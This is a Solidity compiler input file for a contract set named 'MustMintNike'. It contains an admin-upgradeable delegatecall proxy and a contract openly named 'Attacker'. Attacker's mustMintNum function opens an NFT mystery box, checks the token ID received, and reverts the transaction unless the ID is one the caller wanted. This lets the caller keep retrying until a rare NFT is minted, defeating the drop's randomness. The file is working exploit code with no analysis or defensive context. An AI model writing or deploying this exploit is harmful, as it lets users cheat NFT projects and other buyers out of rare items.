{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":true,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"localhost/MustMintNike.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.7.6;\npragma abicoder v2;\n\ncontract AProxy {\n\n  fallback () payable external {\n    _fallback();\n  }\n\n  receive () payable external {\n    _fallback();\n  }\n  \n  address public admin;\n  address _impl;\n  \n  constructor(address newImpl){\n      admin = msg.sender;\n      _impl = newImpl;\n  }\n  \n  function _upgrade(address newImpl) public {\n      require(admin==msg.sender,\"not admin\");\n      _impl = newImpl;\n  }\n\n  function _implementation() public view returns (address) {\n      return _impl;\n  }\n\n  function _delegate(address implementation) internal {\n    assembly {\n      calldatacopy(0, 0, calldatasize())\n\n      let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)\n\n      returndatacopy(0, 0, returndatasize())\n\n      switch result\n      case 0 { revert(0, returndatasize()) }\n      default { return(0, returndatasize()) }\n    }\n  }\n  \n  function _fallback() internal {\n    _delegate(_implementation());\n  }\n}\n\ninterface IERC720 {\n    function mint(address _to, uint256 _count) external payable;\n    function tokenOfOwnerByIndex(address owner,uint256 index) external view returns(uint256 tokenId);\n    function totalSupply() external view returns (uint256);\n    function safeTransferFrom(address _from, address _to, uint256 _id, uint256 _value, bytes calldata _data) external;\n}\n\ncontract Attacker {\n    \n    constructor()  {\n  \n    }\n    \n    function mustMintNum(uint256[] calldata ids,uint256 boxId,IERC720 nft1,IERC720 nft2) public {\n      nft1.safeTransferFrom(msg.sender,address(nft2),boxId,1,bytes(\"\"));\n      uint256 id = nft2.tokenOfOwnerByIndex(msg.sender,0);\n      for(uint256 i = 0; i < ids.length ; i++){\n        if(ids[i]==id){\n          return;\n        }\n      }\n      require(false, \"no match\");\n    }\n    \n   \n}"}}}